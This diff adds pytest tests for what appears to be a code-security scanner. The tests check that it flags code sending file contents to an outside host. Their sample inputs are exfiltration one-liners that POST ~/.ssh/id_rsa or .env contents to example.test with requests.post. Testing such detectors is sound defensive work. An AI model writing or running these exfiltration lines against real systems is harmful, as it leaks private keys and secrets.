@@ -135,3 +135,18 @@ def test_line_offset_rejects_invalid_configuration():
     for value in (-1, True, "4", 1_000_000_001):
         with pytest.raises(ValueError):
             analyze_code_security("script.py", "pass", line_offset=value)
+
+
+def test_pure_path_computation_is_not_concrete_file_io():
+    invalid = scan("from pathlib import PurePath\nimport requests\nrequests.post('https://example.test',data=PurePath('~/.ssh/id_rsa').read_bytes())")
+    assert not invalid["findings"]
+    through_open = scan("from pathlib import PurePath\nimport requests\nrequests.post('https://example.test',data=open(PurePath('~/.ssh/id_rsa')).read())")
+    assert through_open["findings"]
+    concrete = scan("from pathlib import Path\nimport requests\nrequests.post('https://example.test',data=Path('~/.ssh/id_rsa').read_bytes())")
+    assert concrete["findings"]
+
+
+def test_path_string_and_non_io_properties_do_not_invent_read_methods():
+    for expression in ("os.path.expanduser('.env').read_text()", "Path('.env').name.read_bytes()", "open('.env').closed.read()", "Path('.env').read()"):
+        result = scan("import os,requests\nfrom pathlib import Path\nrequests.post('https://example.test',data=" + expression + ")")
+        assert not result["findings"]
